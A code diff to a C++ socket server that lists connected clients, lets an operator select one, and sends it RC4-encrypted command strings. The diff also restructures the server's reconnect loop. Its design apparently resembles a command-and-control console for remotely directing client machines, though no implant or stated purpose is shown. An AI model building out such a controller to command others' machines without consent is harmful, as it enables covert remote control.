@@ -3,6 +3,12 @@
 #include <map>
 #include "ssocket.hpp"
 #include "cmder.hpp"
+
+#ifndef _KEYWORDS_HPP_
+#define _KEYWORDS_HPP_
+#include "keywords.hpp"
+#endif
+
 using namespace std;
 
 map<int, string> clients;
@@ -10,7 +16,7 @@ int currentClient = -1;
 
 void test()
 {
-    cout << "Testing" << endl;
+    // cout << "Starting Server, Please Wait ..." << endl;
 }
 
 void onClientConnect(MySocket::Socket serverSocket)
@@ -35,88 +41,117 @@ void onClientConnect(MySocket::Socket serverSocket)
 
 int main()
 {
-    MySocket::Socket socket(23534);
-
-    socket.Init();
-    socket.Listen(test);
-
-    thread handleClient(onClientConnect, socket);
-    handleClient.detach();
-
-    string terminalPrompt = "> ";
-    string cmdStr;
+    cout << "Starting Server, Please Wait ..." << endl;
     while (1)
     {
-        cout << terminalPrompt;
-        getline(cin, cmdStr);
-        vector<string> Cmds = parseCmds(cmdStr);
+        MySocket::Socket socket(23534);
 
-        string cmdName = Cmds.back();
-        Cmds.pop_back();
+        socket.Init();
+        socket.Listen(test);
 
-        if (cmdName == "/quit")
+        if (socket.isNotConnected())
         {
-            break;
+            socket.Close();
+            continue;
         }
-        // char *eCmd = CreateCmd(cmd);
-        else if (cmdName == "/help")
+
+        thread handleClient(onClientConnect, socket);
+        handleClient.detach();
+
+        string terminalPrompt = "> ";
+        string cmdStr;
+        while (!socket.isNotConnected())
         {
-            displayHelp();
-        }
-        else if (cmdName == "/list_users")
-        {
-            listUsers(clients);
-        }
-        else if (cmdName == "/focus")
-        {
-            if (Cmds.size() >= 1)
+            cout << terminalPrompt;
+            getline(cin, cmdStr);
+            vector<string> Cmds = parseCmds(cmdStr);
+
+            string cmdName = Cmds.back();
+            Cmds.pop_back();
+
+            if (cmdName == "/quit")
             {
-                string uid = Cmds.back();
-                Cmds.pop_back();
-
-                stringstream ss;
-                ss << uid;
-                int uidNum;
-                ss >> uidNum;
-
-                if (clients.find(uidNum) == clients.end())
+                socket.Close();
+                return 0;
+            }
+            // char *eCmd = CreateCmd(cmd);
+            else if (cmdName == "/help")
+            {
+                displayHelp();
+            }
+            else if (cmdName == "/list_users")
+            {
+                listUsers(clients);
+            }
+            else if (cmdName == "/focus")
+            {
+                if (Cmds.size() >= 1)
                 {
-                    cout << "No client with id [" << uidNum << "] ... " << endl;
+                    string uid = Cmds.back();
+                    Cmds.pop_back();
+
+                    stringstream ss;
+                    ss << uid;
+                    int uidNum;
+                    ss >> uidNum;
+
+                    if (clients.find(uidNum) == clients.end())
+                    {
+                        cout << "No client with id [" << uidNum << "] ... " << endl;
+                    }
+                    else
+                    {
+                        currentClient = uidNum;
+                        cout << "Successfuly set client to [" << uidNum << "] ..." << endl;
+                        terminalPrompt = "[" + uid + "]> ";
+                    }
                 }
                 else
                 {
-                    currentClient = uidNum;
-                    cout << "Successfuly set client to [" << uidNum << "] ..." << endl;
-                    terminalPrompt = "[" + uid + "]> ";
+                    displayHelp();
                 }
+            }
+            else if (cmdName == "/current_user")
+            {
+                if (clients.find(currentClient) == clients.end())
+                {
+                    cout << "No client with id [" << currentClient << "] ... " << endl;
+                }
+                else
+                {
+                    cout << "Currently focus on client ["
+                         << currentClient
+                         << "] ... \n"
+                         << "Address: "
+                         << clients.at(currentClient)
+                         << endl;
+                }
+            }
+            else if (cmdName == "/send")
+            {
+                string toSend("");
+                int cmdSize = Cmds.size();
+                for (int i = 0; i < cmdSize; i++)
+                {
+                    // cout << Cmds.back() << endl;
+                    toSend += Cmds.back() + "_";
+                    Cmds.pop_back();
+                }
+
+                cout << "Sending: " << toSend << endl;
+
+                RC4 r(INET_KEY);
+                toSend = r.encrypt(toSend);
+
+                int res = send(currentClient, toSend.c_str(), toSend.size(), 0);
             }
             else
             {
                 displayHelp();
             }
         }
-        else if (cmdName == "/current_user")
-        {
-            if (clients.find(currentClient) == clients.end())
-            {
-                cout << "No client with id [" << currentClient << "] ... " << endl;
-            }
-            else
-            {
-                cout << "Currently focus on client ["
-                     << currentClient
-                     << "] ... \n"
-                     << "Address: "
-                     << clients.at(currentClient)
-                     << endl;
-            }
-        }
-        else
-        {
-            displayHelp();
-        }
+        socket.Close();
     }
 
-    socket.Close();
     return 0;
 }
